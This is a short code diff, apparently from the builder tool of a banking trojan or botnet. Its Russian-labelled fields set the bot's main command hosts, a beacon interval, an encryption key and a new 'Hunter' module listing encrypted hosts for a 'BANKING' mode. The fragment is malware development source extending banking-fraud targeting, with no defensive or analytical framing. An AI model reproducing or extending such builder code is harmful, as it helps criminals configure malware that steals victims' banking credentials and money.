@@ -39,10 +39,11 @@ PCHAR ParamStatus_Error   = "ОШИБКА:         ";
 
 PCHAR StrNoParamValue = "Не установлено значение параметра \r\n --";
 
-PCHAR ParamTitle_Hosts   = "Основные хосты бота";
-PCHAR ParamTitle_Prefix  = "Префикс бота";
-PCHAR ParamTitle_Delay   = "Интервал отстука";
-PCHAR ParamTitle_Password = "Ключ шифрования";
+PCHAR ParamTitle_Hosts        = "Основные хосты бота";
+PCHAR ParamTitle_BankHosts    = "Хосты режима BANKING";
+PCHAR ParamTitle_Prefix       = "Префикс бота";
+PCHAR ParamTitle_Delay        = "Интервал отстука";
+PCHAR ParamTitle_Password     = "Ключ шифрования";
 
 
 
@@ -165,10 +166,17 @@ __fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
 	// Добавляем основные параметры
 	FPrefix    = new TBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
 	FDelay     = new TBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
-	FHosts     = new TBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_HOSTS_BUF_SIZE, ParamTitle_Hosts);
+	FHosts     = new TBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, ParamTitle_Hosts);
 	FPassword  = new TBotPassword(this, true, true, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, ParamTitle_Password);
 
-    FDelay->AsLong = DEFAULT_DELAY;
+
+        // Hunter
+	TBotModule* Module = AddModule(Module_BankHosts);
+	Module->AddParam(true, BOTPARAM_ENCRYPTED_BANKHOSTS, BOTPARAM_BANKHOSTS, MAX_BANKHOSTS_BUF_SIZE, ParamTitle_BankHosts);
+
+
+
+	FDelay->AsLong = DEFAULT_DELAY;
 
     InitializeModules();
 
